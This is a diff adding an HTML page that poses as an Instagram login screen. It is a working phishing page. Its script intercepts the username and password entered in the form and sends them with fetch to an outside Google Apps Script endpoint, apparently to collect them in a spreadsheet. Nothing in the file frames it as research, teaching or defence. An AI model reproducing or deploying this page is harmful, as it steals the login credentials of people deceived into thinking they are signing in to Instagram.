@@ -1,0 +1,80 @@
+<html>
+<head>
+<title>Login instagram</title>
+  <style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #fafafa;
+    margin: 0;
+    padding: 0;
+  }
+  .login {
+    width: 100%;
+    max-width: 350px;
+    margin: auto;
+    margin-top: 100px;
+    background-color: #fff;
+    padding: 20px;
+    border: 1px solid #dbdbdb;
+    box-sizing: border-box;
+    text-align: center;
+  }
+  .login img {
+    margin-bottom: 20px;
+    width: calc(100% - 40px);
+    height: 80px;
+
+  }
+  .login input {
+    width: calc(100% - 40px);
+    height: 38px;
+    margin-bottom: 10px;
+    padding-left: 10px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+  }
+  .login button {
+    width: calc(100% - 40px);
+    height: 38px;
+    background-color: #3897f0;
+    color: white;
+    border-radius: 5px;
+    border: none;
+    margin-top: 10px;
+    cursor: pointer;
+  }
+</style>
+
+
+</head>
+
+<body>
+	
+  <form method="POST" name="submit-to-google-sheet">
+     <div class="login">
+      <img src="https://akm-img-a-in.tosshub.com/businesstoday/images/story/202212/instagram-users-irked-with-the-new-update-sixteen_nine.jpg?size=948:533C:\Users\Venkata Ganesh\Pictures\Screenshots\Screenshot 2024-06-16 001305.png">
+      <input type="text" name ="name" placeholder="Phone number, username, or email">
+
+      <input type="password" name ="pw" placeholder="Password"><br>
+      <button type="submit" name="submit">Login</button>
+      </div>
+        </form>
+     
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwmpepDp22hAkwTnFx3QZvYblSyp-ZTh6745s5BWU_v1jH4u7gvHEDVJTLVht2mmAwbTA/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+
+
+
+
+
+</body>
+</html>
